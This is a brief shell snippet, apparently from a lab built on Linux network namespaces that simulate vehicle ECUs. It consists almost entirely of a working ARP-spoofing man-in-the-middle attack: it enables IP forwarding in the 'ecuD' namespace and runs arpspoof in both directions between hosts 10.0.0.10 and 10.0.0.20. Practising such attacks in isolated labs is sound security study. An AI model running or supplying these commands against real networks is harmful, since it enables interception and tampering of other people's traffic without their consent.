# In ecuD namespace, enable forwarding
sudo ip netns exec ecuD sysctl -w net.ipv4.ip_forward=1

# Start arpspoof (both directions)
sudo ip netns exec ecuD arpspoof -i vethD -t 10.0.0.10 10.0.0.20 &
sudo ip netns exec ecuD arpspoof -i vethD -t 10.0.0.20 10.0.0.10 &